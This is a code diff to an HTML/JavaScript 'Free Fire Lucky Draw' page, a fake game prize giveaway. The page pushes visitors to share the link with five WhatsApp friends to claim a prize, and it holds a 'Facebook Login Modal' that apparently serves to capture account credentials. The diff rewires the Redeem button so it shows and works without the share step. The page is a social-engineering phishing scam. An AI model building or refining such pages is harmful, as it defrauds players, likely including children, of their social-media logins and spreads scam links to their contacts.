@@ -5,6 +5,7 @@
 <title>Free Fire Lucky Draw</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <style>
+/* Same styles as before, unchanged */
 body {
   background: #161a2b;
   color: white;
@@ -252,8 +253,8 @@ h1 {
     Please share this site once to 5 different friends on WhatsApp to redeem your prize
   </button>
 
-  <div id="redeem-area" style="margin-top:15px; display:none;">
-    <button class="redeem-btn" id="redeemBtn" disabled>Redeem</button>
+  <div id="redeem-area" style="margin-top:15px;">
+    <button class="redeem-btn" id="redeemBtn">Redeem</button>
   </div>
 
   <!-- Facebook Login Modal -->
@@ -301,8 +302,8 @@ h1 {
     resultName.textContent = '';
     resultText.style.display = 'block';
     resultText.textContent = 'Click to Open';
-    redeemBtn.disabled = true;
-    redeemArea.style.display = 'none';
+    redeemBtn.disabled = false;
+    redeemArea.style.display = 'block';
     prizePoolDivs.forEach(div => div.classList.remove('highlight'));
     shareBtn.style.display = 'block';
     opened = false;
@@ -336,8 +337,6 @@ h1 {
     resultImg.alt = prizes[idx].name;
     resultImg.style.display = 'block';
     resultName.textContent = prizes[idx].name;
-    redeemBtn.disabled = true;
-    redeemArea.style.display = 'block';
   }
 
   prizeBox.addEventListener('click', () => {
@@ -351,8 +350,6 @@ h1 {
     const siteURL = encodeURIComponent(window.location.href);
     const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Share it with 5 friends and claim your prize: ${siteURL}`;
     window.open(whatsappLink, '_blank');
-    redeemBtn.disabled = false;
-    shareBtn.style.display = 'none';
   });
 
   redeemBtn.addEventListener('click', () => {
